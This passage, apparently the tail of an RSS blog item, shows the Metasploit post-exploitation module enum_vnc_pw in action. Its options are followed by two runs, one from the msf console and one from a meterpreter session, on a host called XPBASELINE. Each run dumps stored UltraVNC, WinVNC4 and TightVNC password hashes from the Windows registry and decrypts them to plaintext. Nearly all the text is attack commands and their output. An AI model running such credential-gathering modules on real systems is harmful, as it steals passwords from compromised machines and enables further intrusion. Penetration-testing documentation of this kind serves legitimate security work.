   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf post(enum_vnc_pw) &amp;gt; run

[*] Enumerating VNC passwords on XPBASELINE
[*] Checking UltraVNC...
[+] UltraVNC =&amp;gt; A85B4C5976979DE93B =&amp;gt; thisismy on port: 5900
[+] VIEW ONLY: UltraVNC =&amp;gt; DE2C1BA7393F6708B3 =&amp;gt; 111 on port: 5900
[*] Checking WinVNC3_HKLM...
[*] Checking WinVNC3_HKCU...
[*] Checking WinVNC3_HKLM_Default...
[*] Checking WinVNC3_HKCU_Default...
[*] Checking WinVNC_HKLM_Default...
[*] Checking WinVNC_HKCU_Default...
[*] Checking WinVNC4_HKLM...
[+] WinVNC4_HKLM =&amp;gt; c777b2de337a91cf =&amp;gt; mypasswo on port: 5900
[*] Checking WinVNC4_HKCU...
[*] Checking RealVNC_HKLM...
[*] Checking RealVNC_HKCU...
[*] Checking TightVNC_HKLM...
[+] TightVNC_HKLM =&amp;gt; 7ebf1e76f732459f =&amp;gt; authpass on port: 5900
[*] Checking TightVNC_HKLM_Control_pass...
[+] TightVNC_HKLM_Control_pass =&amp;gt; f0299fd0e927cf2f =&amp;gt; adminpas on port: 5900
[*] Post module execution completed

msf post(enum_vnc_pw) &amp;gt; sessions -i 1
[*] Starting interaction with 1...

meterpreter &amp;gt; run post/windows/gather/enum_vnc_pw 

[*] Enumerating VNC passwords on XPBASELINE
[*] Checking UltraVNC...
[+] UltraVNC =&amp;gt; A85B4C5976979DE93B =&amp;gt; thisismy on port: 5900
[+] VIEW ONLY: UltraVNC =&amp;gt; DE2C1BA7393F6708B3 =&amp;gt; 111 on port: 5900
[*] Checking WinVNC3_HKLM...
[*] Checking WinVNC3_HKCU...
[*] Checking WinVNC3_HKLM_Default...
[*] Checking WinVNC3_HKCU_Default...
[*] Checking WinVNC_HKLM_Default...
[*] Checking WinVNC_HKCU_Default...
[*] Checking WinVNC4_HKLM...
[+] WinVNC4_HKLM =&amp;gt; c777b2de337a91cf =&amp;gt; mypasswo on port: 5900
[*] Checking WinVNC4_HKCU...
[*] Checking RealVNC_HKLM...
[*] Checking RealVNC_HKCU...
[*] Checking TightVNC_HKLM...
[+] TightVNC_HKLM =&amp;gt; 7ebf1e76f732459f =&amp;gt; authpass on port: 5900
[*] Checking TightVNC_HKLM_Control_pass...
[+] TightVNC_HKLM_Control_pass =&amp;gt; f0299fd0e927cf2f =&amp;gt; adminpas on port: 5900
meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
  </channel>
</rss>
